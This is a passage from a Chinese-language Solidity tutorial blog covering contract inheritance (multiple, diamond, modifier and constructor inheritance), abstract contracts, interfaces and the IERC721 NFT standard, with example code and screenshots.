class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Yeye&#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line">    // 定义3个function: hip(), pop(), yeye()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出改为Baba。</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126213523593.png" alt="image-20250126213523593"></p><h3 id="多重继承">多重继承</h3><p><code>Solidity</code>的合约可以继承多个合约。规则：</p><ol><li>继承时要按辈分最高到最低的顺序排。比如我们写一个<code>Erzi</code>合约，继承<code>Yeye</code>合约和<code>Baba</code>合约，那么就要写成<code>contract Erzi is Yeye, Baba</code>，而不能写成<code>contract Erzi is Baba, Yeye</code>，不然就会报错。</li><li>如果某一个函数在多个继承的合约里都存在，比如例子中的<code>hip()</code>和<code>pop()</code>，在子合约里必须重写，不然会报错。</li><li>重写在多个父合约中都重名的函数时，<code>override</code>关键字后面要加上所有父合约名字，例如<code>override(Yeye, Baba)</code>。</li></ol><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract Erzi is Yeye, Baba&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出值为Erzi。</span><br><span class="line">    function hip() public virtual override(Yeye, Baba)&#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override(Yeye, Baba) &#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>Erzi</code>合约里面重写了<code>hip()</code>和<code>pop()</code>两个函数，将输出改为<code>”Erzi”</code>，并且还分别从<code>Yeye</code>和<code>Baba</code>合约继承了<code>yeye()</code>和<code>baba()</code>两个函数。</p><p>完整的测试代码<code>Yeye.sol</code>，完整的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Yeye&#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line">    // 定义3个function: hip(), pop(), yeye()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出改为Baba。</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Erzi is Yeye, Baba&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出值为Erzi。</span><br><span class="line">    function hip() public virtual override(Yeye, Baba)&#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override(Yeye, Baba) &#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126213416543.png" alt="image-20250126213416543"></p><h3 id="修饰器的继承">修饰器的继承</h3><p><code>Solidity</code>中的修饰器（<code>Modifier</code>）同样可以继承，用法与函数继承类似，在相应的地方加<code>virtual</code>和<code>override</code>关键字即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Base1 &#123;</span><br><span class="line">    modifier exactDividedBy2And3(uint _a) virtual &#123;</span><br><span class="line">        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Identifier is Base1 &#123;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数</span><br><span class="line">    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123;</span><br><span class="line">        return getExactDividedBy2And3WithoutModifier(_dividend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值</span><br><span class="line">    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123;</span><br><span class="line">        uint div2 = _dividend / 2;</span><br><span class="line">        uint div3 = _dividend / 3;</span><br><span class="line">        return (div2, div3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Identifier</code>合约可以直接在代码中使用父合约中的<code>exactDividedBy2And3</code>修饰器，也可以利用<code>override</code>关键字重写修饰器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier exactDividedBy2And3(uint _a) override &#123;</span><br><span class="line">    _;</span><br><span class="line">    require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126214328979.png" alt="image-20250126214328979"></p><p>完整的测试代码<code>Base1.sol</code>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract Base1 &#123;</span><br><span class="line">    modifier exactDividedBy2And3(uint _a) virtual &#123;</span><br><span class="line">        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Identifier is Base1 &#123;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数</span><br><span class="line">    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123;</span><br><span class="line">        return getExactDividedBy2And3WithoutModifier(_dividend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值</span><br><span class="line">    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123;</span><br><span class="line">        uint div2 = _dividend / 2;</span><br><span class="line">        uint div3 = _dividend / 3;</span><br><span class="line">        return (div2, div3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数的继承">构造函数的继承</h3><p>子合约有两种方法继承父合约的构造函数。举个简单的例子，父合约<code>A</code>里面有一个状态变量<code>a</code>，并由构造函数的参数来确定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 构造函数的继承</span><br><span class="line">abstract contract A &#123;</span><br><span class="line">    uint public a;</span><br><span class="line"></span><br><span class="line">    constructor(uint _a) &#123;</span><br><span class="line">        a = _a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>在继承时声明父构造函数的参数，例如：<code>contract B is A(6)</code></li><li>在子合约的构造函数中声明构造函数的参数，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的测试代码<code>A.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract A&#123;</span><br><span class="line">    uint public a;</span><br><span class="line">    constructor(uint _a) &#123;</span><br><span class="line">        a = _a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126214956006.png" alt="image-20250126214956006"></p><h3 id="调用父合约的函数">调用父合约的函数</h3><p>子合约有两种方式调用父合约的函数，直接调用和利用<code>super</code>关键字。</p><ol><li>直接调用：子合约可以直接用<code>父合约名.函数名()</code>的方式来调用父合约函数，例如<code>Yeye.pop()</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callParent() public&#123;</span><br><span class="line">    Yeye.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>super</code>关键字：子合约可以利用<code>super.函数名()</code>来调用最近的父合约函数。<code>Solidity</code>继承关系按声明时从右到左的顺序是：<code>contract Erzi is Yeye, Baba</code>，那么<code>Baba</code>是最近的父合约，<code>super.pop()</code>将调用<code>Baba.pop()</code>而不是<code>Yeye.pop()</code>：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function callParentSuper() public&#123;</span><br><span class="line">    // 将调用最近的父合约函数，Baba.pop()</span><br><span class="line">    super.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="钻石继承">钻石继承</h3><p>在面向对象编程中，钻石继承（菱形继承）指一个派生类同时有两个或两个以上的基类。</p><p>在多重+菱形继承链条上使用<code>super</code>关键字时，需要注意的是使用<code>super</code>会调用继承链条上的每一个合约的相关函数，而不是只调用最近的父合约。</p><p>我们先写一个合约<code>God</code>，再写<code>Adam</code>和<code>Eve</code>两个合约继承<code>God</code>合约，最后让创建合约<code>people</code>继承自<code>Adam</code>和<code>Eve</code>，每个合约都有<code>foo</code>和<code>bar</code>两个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">/* 继承树：</span><br><span class="line">  God</span><br><span class="line"> /  \</span><br><span class="line">Adam Eve</span><br><span class="line"> \  /</span><br><span class="line">people</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">contract God &#123;</span><br><span class="line">    event Log(string message);</span><br><span class="line"></span><br><span class="line">    function foo() public virtual &#123;</span><br><span class="line">        emit Log(&quot;God.foo called&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public virtual &#123;</span><br><span class="line">        emit Log(&quot;God.bar called&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Adam is God &#123;</span><br><span class="line">    function foo() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Adam.foo called&quot;);</span><br><span class="line">        super.foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Adam.bar called&quot;);</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Eve is God &#123;</span><br><span class="line">    function foo() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Eve.foo called&quot;);</span><br><span class="line">        super.foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Eve.bar called&quot;);</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract people is Adam, Eve &#123;</span><br><span class="line">    function foo() public override(Adam, Eve) &#123;</span><br><span class="line">        super.foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public override(Adam, Eve) &#123;</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，调用合约<code>people</code>中的<code>super.bar()</code>会依次调用<code>Eve</code>、<code>Adam</code>，最后是<code>God</code>合约。</p><p>虽然<code>Eve</code>、<code>Adam</code>都是<code>God</code>的子合约，但整个过程中<code>God</code>合约只会被调用一次。原因是<code>Solidity</code>借鉴了Python的方式，强制一个由基类构成的DAG（有向无环图）使其保证一个特定的顺序。更多细节你可以查阅<a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html?highlight=%E7%BB%A7%E6%89%BF#index-16">Solidity的官方文档</a>。</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126223941045.png" alt="image-20250126223941045"></p><h2 id="抽象合约和接口">抽象合约和接口</h2><p>这一讲，我们用<code>ERC721</code>的接口合约为例介绍<code>Solidity</code>中的抽象合约（<code>abstract</code>）和接口（<code>interface</code>），帮助大家更好的理解<code>ERC721</code>标准。</p><p><code>ERC-721</code>是以太坊网络上用于<strong>实现非同质化代币（NFT）的标准。它定义了一组规则，允许创建具有唯一性的数字资产或代币。与ERC-20标准的同质化代币不同</strong>，<code>ERC-721</code>代币每一个都是独一无二的，可以用来表示艺术作品、收藏品、游戏道具、房地产等独特的资产。</p><h3 id="抽象合约">抽象合约</h3><p>如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体<code>&#123;&#125;</code>中的内容，则必须将该合约标为<code>abstract</code>，不然编译会报错；另外，未实现的函数需要加<code>virtual</code>，以便子合约重写。如果我们还没想好具体怎么实现某个函数，那么可以把合约标为<code>abstract</code>，之后让别人补写上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abstract contract InsertionSort&#123;</span><br><span class="line">    function insertionSort(uint[] memory a) public pure virtual returns(uint[] memory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试抽象合约的代码<code>Abstract.sol</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">abstract contract Base&#123;</span><br><span class="line">    string public name = &quot;Base&quot;;</span><br><span class="line">    function getAlias() public pure virtual returns(string memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BaseImpl is Base&#123;</span><br><span class="line">    function getAlias() public pure override returns(string memory)&#123;</span><br><span class="line">        return &quot;BaseImpl&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果如下：</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127032832688.png" alt="image-20250127032832688"></p><h3 id="接口">接口</h3><p>接口类似于抽象合约，但它不实现任何功能。接口的规则：</p><ol><li><strong>不能包含状态变量</strong></li><li><strong>不能包含构造函数</strong></li><li><strong>不能继承除接口外的其他合约</strong></li><li><strong>所有函数都必须是external且不能有函数体</strong></li><li><strong>继承接口的非抽象合约必须实现接口定义的所有功能</strong></li></ol><p>虽然接口不实现任何功能，但它非常重要。接口是智能合约的骨架，定义了合约的功能以及如何触发它们。</p><p>如果智能合约实现了某种接口（比如<code>ERC20</code>或<code>ERC721</code>），其他Dapps和智能合约就知道如何与它交互。</p><p>因为接口提供了两个重要的信息：</p><ol><li>合约里每个函数的<code>bytes4</code>选择器，以及函数签名<code>函数名(每个参数类型）</code>。</li><li>接口id（更多信息见<a href="https://eips.ethereum.org/EIPS/eip-165">EIP165</a>）</li></ol><p>另外，接口与合约<code>ABI</code>（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的<code>ABI</code>，利用<a href="https://gnidan.github.io/abi-to-sol/">abi-to-sol工具</a>，也可以将<code>ABI json</code>文件转换为<code>接口sol</code>文件。</p><p>我们以<code>ERC721</code>接口合约<code>IERC721</code>为例，它定义了3个<code>event</code>和9个<code>function</code>，所有<code>ERC721</code>标准的NFT都实现了这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以<code>;</code>代替函数体<code>&#123; &#125;</code>结尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721 is IERC165 &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);</span><br><span class="line">    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);</span><br><span class="line">    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);</span><br><span class="line">    </span><br><span class="line">    function balanceOf(address owner) external view returns (uint256 balance);</span><br><span class="line"></span><br><span class="line">    function ownerOf(uint256 tokenId) external view returns (address owner);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function approve(address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function getApproved(uint256 tokenId) external view returns (address operator);</span><br><span class="line"></span><br><span class="line">    function setApprovalForAll(address operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">    function isApprovedForAll(address owner, address operator) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试接口的代码<code>Interface.sol</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">interface Base&#123;</span><br><span class="line">    function getFirstName() external pure returns (string memory);</span><br><span class="line">    function getLastName() external pure returns (string memory);</span><br><span class="line">&#125;</span><br><span class="line">contract BaseImpl is Base&#123;</span><br><span class="line">    function getFirstName() external pure override returns(string memory)&#123;</span><br><span class="line">        return &quot;Amazing&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function getLastName() external pure override returns(string memory)&#123;</span><br><span class="line">        return &quot;Ang&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127121544577.png" alt="image-20250127121544577"></p><h3 id="IERC721事件">IERC721事件</h3><p><code>IERC721</code>包含3个事件，其中<code>Transfer</code>和<code>Approval</code>事件在<code>ERC20</code>中也有。</p><ul><li><code>Transfer</code>事件：在转账时被释放，记录代币的发出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>Approval</code>事件：在授权时被释放，记录授权地址<code>owner</code>，被授权地址<code>approved</code>和<code>tokenId</code>。</li><li><code>ApprovalForAll</code>事件：在批量授权时被释放，记录批量授权的发出地址<code>owner</code>，被授权地址<code>operator</code>和授权与否的<code>approved</code>。</li></ul><h3 id="IERC721函数">IERC721函数</h3><ul><li><code>balanceOf</code>：返回某地址的NFT持有量<code>balance</code>。</li><li><code>ownerOf</code>：返回某<code>tokenId</code>的主人<code>owner</code>。</li><li><code>transferFrom</code>：普通转账，参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>safeTransferFrom</code>：安全转账（如果接收方是合约地址，会要求实现<code>ERC721Receiver</code>接口）。参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>approve</code>：授权另一个地址使用你的NFT。参数为被授权地址<code>approve</code>和<code>tokenId</code>。</li><li><code>getApproved</code>：查询<code>tokenId</code>被批准给了哪个地址。</li><li><code>setApprovalForAll</code>：将自己持有的该系列NFT批量授权给某个地址<code>operator</code>。</li><li><code>isApprovedForAll</code>：查询某地址的NFT是否批量授权给了另一个<code>operator</code>地址。</li><li><code>safeTransferFrom</code>：安全转账的重载函数，参数里面包含了<code>data</code>。</li></ul><h3 id="什么时候使用接口？">什么时候使用接口？</h3><p>如果我们知道一个合约实现了<code>IERC721</code>接口，我们不需要知道它具体代码实现，就可以与它交互。</p><p>无聊猿<code>BAYC</code>属于<code>ERC721</code>代币，实现了<code>IERC721</code>接口的功能。我们不需要知道它的源代码，只需知道它的合约地址，用<code>IERC721</code>接口就可以与它交互，比如用<code>balanceOf()</code>来查询某个地址的<code>BAYC</code>余额，用<code>safeTransferFrom()</code>来转账<code>BAYC</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract interactBAYC &#123;</span><br><span class="line">    // 利用BAYC地址创建接口合约变量（ETH主网）</span><br><span class="line">    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);</span><br><span class="line"></span><br><span class="line">    // 通过接口调用BAYC的balanceOf()查询持仓量</span><br><span class="line">    function balanceOfBAYC(address owner) external view returns (uint256 balance)&#123;</span><br><span class="line">        return BAYC.balanceOf(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 通过接口调用BAYC的safeTransferFrom()安全转账</span><br><span class="line">    function safeTransferFromBAYC(address from, address to, uint256 tokenId) external&#123;</span><br><span class="line">        BAYC.safeTransferFrom(from, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异常">异常</h2><p>这一讲，我们介绍<code>Solidity</code>三种抛出异常的方法：<code>error</code>，<code>require</code>和<code>assert</code>，并比较三种方法的<code>gas</code>消耗。</p><h3 id="异常-2">异常</h3><p>写智能合约经常会出<code>bug</code>，<code>Solidity</code>中的异常命令帮助我们<code>debug</code>。</p><p>测试代码<code>Error.sol</code>，如下：</p><figure class="highlight 